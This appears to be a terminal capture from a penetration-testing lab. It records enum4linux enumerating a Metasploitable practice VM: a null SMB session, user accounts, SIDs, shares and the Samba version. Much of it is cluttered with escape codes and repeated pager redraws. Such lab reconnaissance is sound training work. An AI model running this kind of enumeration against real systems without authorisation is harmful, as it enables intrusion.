+[+] [0m[32m Getting local group memberships:
+
+[0m[33m
+[+] [0m[32m Getting domain groups:
+
+[0m[33m
+[+] [0m[32m Getting domain group memberships:
+
+[0m
+[34m =================( [0m[32mUsers on 192.168.56.102 via RID cycling (RIDS: 500-550,1000-1050)[0m[34m )=================
+
+[0m[33m
+[I] [0m[36mFound new SID: 
+[0mS-1-5-21-1042354039-2475377354-766472396
+[33m
+[+] [0m[32mEnumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''
+
+[0mS-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)
+S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
+S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)
+
+[34m ==============================( [0m[32mGetting printer info for 192.168.56.102[0m[34m )==============================
+
+[0mNo printers returned.
+
+
+enum4linux complete on Fri Nov 28 21:01:18 2025
+
+                                                                                                                                                               ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hl[36ml[39m[36ml[36me[39m[39m[4ml[39m[4me[24m[4ml[4me[4me[24m[4me[4ms[24m[4ms[4m [24m[4ms[24m[24m [4me[24m[24m [4ml[4me[24m[24m [4ml[4me[4ms[24m[4ms[4ms[24m[24m[36ml[24m[36me[24m[36ms[24m[36ms[39m[36ms[36m [39m[36ms[39m[39m e[1me[0m[1me[1mn[0m[1mn[1mu[0m[1mu[1mm[0m[1mm[1m4[0m[1m4[1ml[0m[0me[0mn[0mu[0mm[0m4[0ml [1me[1mn[1mu[1mm[1m4[0m[1m4[1m_[0m[1m_[1mo[0m[1mo[1mu[0m[1mu[1mt[0m[14D[36me[36mn[36mu[36mm[39m4[1ml[1mi[1mn[1mu[1mx[1m [1m-[1ma[1m [0m192.168.56.102 | tee enum4_output.txt[48D[36mm[36m4[0m[36ml[0m[36mi[0m[36mn[0m[36mu[0m[36mx[39m[0m [0m[32m-[0m[32ma[39m[0m [15C[1m[34m|[0m[39m [36mt[36me[36me[39m [1me[1mn[1mu[1mm[1m4[1m_[1mo[1mu[1mt[1mp[1mu[1mt[1m.[1mt[1mx[1mt[0m[P[18C [19D[39m[4mt[39m[4me[24m[P[18C [19D[P[18C [19D[P[18C [19D[24me[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[32ma[32me[39m[P[18C [19D[P[18C [19D[39me[P[18C [19D[10D[39m[4me[39m[4mn[39m[4mu[39m[4mm[39m[4m4[39m[4ml[39m[4mi[39m[4mn[39m[4mu[39m[4mx[4me[24m[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[P[18C [19D[4me[24m[P[18C [19D[P[18C [19D[24ml[4me[24m[0m [1me[1mn[1mu[1mm[1m4[1m_[1mo[1mu[1mt[1mp[1mu[1mt[1m.[1mt[1mx[1mt[0m[18D[4ml[1C[4ml[4me[4ms[24m[0m [1me[1mn[1mu[1mm[1m4[1m_[1mo[1mu[1mt[1mp[1mu[1mt[1m.[1mt[1mx[1mt[0m[17D[4ms[4ms[24m[0m [1me[1mn[1mu[1mm[1m4[1m_[1mo[1mu[1mt[1mp[1mu[1mt[1m.[1mt[1mx[1mt[0m[17D[24m[36ml[24m[36me[24m[36ms[24m[36ms[39m[?1l>[?2004l
+"enum4_output.txt" may be a binary file.  See it anyway? 
+[?1049h[22;0;0t[28;1H[?1h=Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 28 21:01:09 2025
+
+[01;33mESC[0m[34m =========================================( [01;33mESC[0m[0m[01;33mESC[0m[32mTarget Information[01;33mESC[0m[0m[01;33mESC[0m[34m )=========================================
+
+[01;33mESC[0m[0mTarget ........... 192.168.56.102
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+[01;33mESC[0m[34m ===========================( [01;33mESC[0m[0m[01;33mESC[0m[32mEnumerating Workgroup/Domain on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===========================
+
+[01;33mESC[0m[0m[01;33mESC[0m[33m
+[+] [01;33mESC[0m[0m[01;33mESC[0m[32mGot domain/workgroup name: WORKGROUP
+
+[01;33mESC[0m[0m
+[01;33mESC[0m[34m ===============================( [01;33mESC[0m[0m[01;33mESC[0m[32mNbtstat Information for 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===============================
+
+[01;33mESC[0m[0mLooking up status of 192.168.56.102
+        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
+        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
+        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+[01;33menum4_output.txt[0m[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KESCESC[K [KESCESC[KESCESC[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K:[K...skipping...
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 28 21:01:09 2025
+
+[01;33mESC[0m[34m =========================================( [01;33mESC[0m[0m[01;33mESC[0m[32mTarget Information[01;33mESC[0m[0m[01;33mESC[0m[34m )=========================================
+
+[01;33mESC[0m[0mTarget ........... 192.168.56.102
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+[01;33mESC[0m[34m ===========================( [01;33mESC[0m[0m[01;33mESC[0m[32mEnumerating Workgroup/Domain on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===========================
+
+[01;33mESC[0m[0m[01;33mESC[0m[33m
+[+] [01;33mESC[0m[0m[01;33mESC[0m[32mGot domain/workgroup name: WORKGROUP
+
+[01;33mESC[0m[0m
+[01;33mESC[0m[34m ===============================( [01;33mESC[0m[0m[01;33mESC[0m[32mNbtstat Information for 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===============================
+
+[01;33mESC[0m[0mLooking up status of 192.168.56.102
+        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
+        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
+        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+[01;33mESC[0m[34m ==================================( [01;33mESC[0m[0m[01;33mESC[0m[32mSession Check on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )==================================
+
+[01;33mESC[0m[0m[01;33mESC[0m[33m
+[+] [01;33mESC[0m[0m[01;33mESC[0m[32mServer 192.168.56.102 allows sessions using username '', password ''
+
+[01;33mESC[0m[0m
+[01;33mESC[0m[34m ===============================( [01;33mESC[0m[0m[01;33mESC[0m[32mGetting domain SID for 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===============================
+
+[01;33mESC[0m[0mDomain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[01;33mESC[0m[33m
+[+] [01;33mESC[0m[0m[01;33mESC[0m[32mCan't determine if host is part of domain or part of a workgroup
+
+[01;33mESC[0m[0m
+[01;33mESC[0m[34m ==================================( [01;33mESC[0m[0m[01;33mESC[0m[32mOS information on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )==================================
+
+[01;33mESC[0m[0m[01;33mESC[0m[33m
+[E] [01;33mESC[0m[0m[01;33mESC[0m[31mCan't get OS info with smbclient
+
+[01;33mESC[0m[0m[01;33mESC[0m[33m
+[+] [01;33mESC[0m[0m[01;33mESC[0m[32mGot OS info for 192.168.56.102 from srvinfo: 
+[01;33mESC[0m[0m  METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
+:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KBB[K        platform_id     :       500
+:[K[K [KESCESC[KOO[KBB[K        os version      :       4.9
+:[K[K [KESCESC[KOO[KBB[K        server type     :       0x9a03
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[34m ======================================( [01;33mESC[0m[0m[01;33mESC[0m[32mUsers on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )======================================
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0mindex: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games      Name: games     Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KAA[K[HM        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[01;33mESC[0m[0mLooking up status of 192.168.56.102
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[01;33mESC[0m[34m ===============================( [01;33mESC[0m[0m[01;33mESC[0m[32mNbtstat Information for 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===============================
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[01;33mESC[0m[0m
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[+] [01;33mESC[0m[0m[01;33mESC[0m[32mGot domain/workgroup name: WORKGROUP
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[01;33mESC[0m[0m[01;33mESC[0m[33m
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[01;33mESC[0m[34m ===========================( [01;33mESC[0m[0m[01;33mESC[0m[32mEnumerating Workgroup/Domain on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )===========================
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HMKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HMPassword ......... ''
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HMUsername ......... ''
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HMRID Range ........ 500-550,1000-1050
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[01;33mESC[0m[0mTarget ........... 192.168.56.102
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM[01;33mESC[0m[34m =========================================( [01;33mESC[0m[0m[01;33mESC[0m[32mTarget Information[01;33mESC[0m[0m[01;33mESC[0m[34m )=========================================
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[HMStarting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 28 21:01:09 2025
+[53;1H[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KBB[K        platform_id     :       500
+:[K[K [KESCESC[KOO[KBB[K        os version      :       4.9
+:[K[K [KESCESC[KOO[KBB[K        server type     :       0x9a03
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[34m ======================================( [01;33mESC[0m[0m[01;33mESC[0m[32mUsers on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )======================================
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0mindex: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games      Name: games     Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[Kindex: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[Kuser:[games] rid:[0x3f2]
+:[K[K [KESCESC[KOO[KBB[Kuser:[nobody] rid:[0x1f5]
+:[K[K [KESCESC[KOO[KBB[Kuser:[bind] rid:[0x4ba]
+:[K[K [KESCESC[KOO[KBB[Kuser:[proxy] rid:[0x402]
+:[K[K [KESCESC[KOO[KBB[Kuser:[syslog] rid:[0x4b4]
+:[K[K [KESCESC[KOO[KBB[Kuser:[user] rid:[0xbba]
+:[K[K [KESCESC[KOO[KBB[Kuser:[www-data] rid:[0x42a]
+:[K[K [KESCESC[KOO[KBB[Kuser:[root] rid:[0x3e8]
+:[K[K [KESCESC[KOO[KBB[Kuser:[news] rid:[0x3fa]
+:[K[K [KESCESC[KOO[KBB[Kuser:[postgres] rid:[0x4c0]
+:[K[K [KESCESC[KOO[KBB[Kuser:[bin] rid:[0x3ec]
+:[K[K [KESCESC[KOO[KBB[Kuser:[mail] rid:[0x3f8]
+:[K[K [KESCESC[KOO[KBB[Kuser:[distccd] rid:[0x4c6]
+:[K[K [KESCESC[KOO[KBB[Kuser:[proftpd] rid:[0x4ca]
+:[K[K [KESCESC[KOO[KBB[Kuser:[dhcp] rid:[0x4b2]
+:[K[K [KESCESC[KOO[KBB[Kuser:[daemon] rid:[0x3ea]
+:[K[K [KESCESC[KOO[KBB[Kuser:[sshd] rid:[0x4b8]
+:[K[K [KESCESC[KOO[KBB[Kuser:[man] rid:[0x3f4]
+:[K[K [KESCESC[KOO[KBB[Kuser:[lp] rid:[0x3f6]
+:[K[K [KESCESC[KOO[KBB[Kuser:[mysql] rid:[0x4c2]
+:[K[K [KESCESC[KOO[KBB[Kuser:[gnats] rid:[0x43a]
+:[K[K [KESCESC[KOO[KBB[Kuser:[libuuid] rid:[0x4b0]
+:[K[K [KESCESC[KOO[KBB[Kuser:[backup] rid:[0x42c]
+:[K[K [KESCESC[KOO[KBB[Kuser:[msfadmin] rid:[0xbb8]
+:[K[K [KESCESC[KOO[KBB[Kuser:[telnetd] rid:[0x4c8]
+:[K[K [KESCESC[KOO[KBB[Kuser:[sys] rid:[0x3ee]
+:[K[K [KESCESC[KOO[KBB[Kuser:[klog] rid:[0x4b6]
+:[K[K [KESCESC[KOO[KBB[Kuser:[postfix] rid:[0x4bc]
+:[K[K [KESCESC[KOO[KBB[Kuser:[service] rid:[0xbbc]
+:[K[K [KESCESC[KOO[KBB[Kuser:[list] rid:[0x434]
+:[K[K [KESCESC[KOO[KBB[Kuser:[irc] rid:[0x436]
+:[K[K [KESCESC[KOO[KBB[Kuser:[ftp] rid:[0x4be]
+:[K[K [KESCESC[KOO[KBB[Kuser:[tomcat55] rid:[0x4c4]
+:[K[K [KESCESC[KOO[KBB[Kuser:[sync] rid:[0x3f0]
+:[K[K [KESCESC[KOO[KBB[Kuser:[uucp] rid:[0x3fc]
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[34m ================================( [01;33mESC[0m[0m[01;33mESC[0m[32mShare Enumeration on 192.168.56.102[01;33mESC[0m[0m[01;33mESC[0m[34m )================================
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[0m
+:[K[K [KESCESC[KOO[KBB[K        Sharename       Type      Comment
+:[K[K [KESCESC[KOO[KBB[K        ---------       ----      -------
+:[K[K [KESCESC[KOO[KBB[K        print$          Disk      Printer Drivers
+:[K[K [KESCESC[KOO[KBB[K        tmp             Disk      oh noes!
+:[K[K [KESCESC[KOO[KBB[K        opt             Disk      
+:[K[K [KESCESC[KOO[KBB[K        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+:[K[K [KESCESC[KOO[KBB[K        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+:[K[K [KESCESC[KOO[KBB[KReconnecting with SMB1 for workgroup listing.
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        Server               Comment
+:[K[K [KESCESC[KOO[KBB[K        ---------            -------
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        Workgroup            Master
+:[K[K [KESCESC[KOO[KBB[K        ---------            -------
+:[K[K [KESCESC[KOO[KBB[K        WORKGROUP            METASPLOITABLE
+:[K[K [KESCESC[KOO[KBB[K[01;33mESC[0m[33m
+:[K[K [KESCESC[KOO[KBB[K[+] [01;33mESC[0m[0m[01;33mESC[0m[32mAttempting to map shares on 192.168.56.102
+:[K[K [KESCESC[KOO[KBB[K
